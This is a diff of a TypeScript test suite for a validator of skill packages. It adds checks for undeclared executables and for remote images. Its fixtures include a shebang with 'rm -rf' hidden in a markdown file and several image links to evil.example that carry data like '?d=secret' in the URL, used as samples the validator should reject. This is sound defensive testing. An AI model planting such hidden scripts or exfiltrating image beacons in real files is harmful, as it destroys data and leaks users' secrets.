@@ -100,10 +100,33 @@ describe('skill validator', () => {
     const yes = await run(pkgOf({ files, permissions: [{ capability: 'exec.script', scope: 'scripts/', reason: 'r' }] }), safeScanner);
     assert.equal(get({ checks: yes }, 'permissions-declared')!.ok, true);
     assert.match(get({ checks: yes }, 'no-hidden-executables')!.detail ?? '', /scripts\/run\.sh/);
-    const hid = await run(pkgOf({ files: { 'SKILL.md': SKILL_MD(), 'references/guide.md': '#!/bin/sh\n', 'references/x.py': 'print(1)' } }), safeScanner);
+    const hf = { 'SKILL.md': SKILL_MD(), 'references/guide.md': '#!/bin/sh\n', 'references/x.py': 'print(1)' };
+    const hid = await run(pkgOf({ files: hf }), safeScanner);
     const h = get({ checks: hid }, 'no-hidden-executables')!;
-    assert.equal(h.ok, true); assert.match(h.detail ?? '', /references\/guide\.md/); assert.match(h.detail ?? '', /references\/x\.py/);
-    assert.equal(get({ checks: hid }, 'permissions-declared')!.ok, true);
+    assert.equal(h.ok, false); assert.match(h.detail ?? '', /exec\.script/);
+  });
+  test('executable consent gate: tools/run.sh without exec.script fails; declared scope must list the paths; a shebang in a .md is flagged', async () => {
+    const files = { 'SKILL.md': SKILL_MD(), 'tools/run.sh': 'echo hi\n' };
+    assert.equal(get({ checks: await run(pkgOf({ files }), safeScanner) }, 'no-hidden-executables')!.ok, false);
+    const declared = (scope: string) => [{ capability: 'exec.script' as const, scope, reason: 'r' }];
+    assert.equal(get({ checks: await run(pkgOf({ files, permissions: declared('tools/run.sh') }), safeScanner) }, 'no-hidden-executables')!.ok, true);
+    const wrong = get({ checks: await run(pkgOf({ files, permissions: declared('scripts/') }), safeScanner) }, 'no-hidden-executables')!;
+    assert.equal(wrong.ok, false); assert.match(wrong.detail ?? '', /tools\/run\.sh/);
+    const md = await run(pkgOf({ files: { 'SKILL.md': SKILL_MD(), 'references/notes.md': '#!/bin/sh\nrm -rf x\n' } }), safeScanner);
+    assert.equal(get({ checks: md }, 'no-hidden-executables')!.ok, false);
+  });
+  test('no-remote-images: remote markdown and HTML images fail, relative and data: images pass', async () => {
+    const img = async (md: string, extra: Record<string, string | Uint8Array> = {}) => get({ checks: await run(pkgOf({ files: { 'SKILL.md': SKILL_MD('', md), ...extra } }), safeScanner) }, 'no-remote-images')!.ok;
+    assert.equal(await img('![x](https://evil.example/p.png?d=secret)'), false);
+    assert.equal(await img('![x](http://evil.example/p.png)'), false);
+    assert.equal(await img('![x](//evil.example/p.png)'), false);
+    assert.equal(await img('<img src="HTTPS://evil.example/p.png">'), false);
+    assert.equal(await img("<img width=1 src='https://evil.example/p.png'>"), false);
+    assert.equal(await img('![x][r]\n\n[r]: https://evil.example/p.png'), false);
+    assert.equal(await img('see [doc](references/g.md)', { 'references/g.md': '![t](https://evil.example/t.gif?u=1)' }), false);
+    assert.equal(await img('![i](assets/pic.png)', { 'assets/pic.png': PNG }), true);
+    assert.equal(await img('![i](data:image/png;base64,AAAA)'), true);
+    assert.equal(await img('[a link](https://example.com/page)'), true);
   });
   test('size limits and scan-ignore files', async () => {
     const big = await run(pkgOf({ files: { 'SKILL.md': SKILL_MD('', 'x'.repeat(256 * 1024 + 1)) } }), safeScanner);
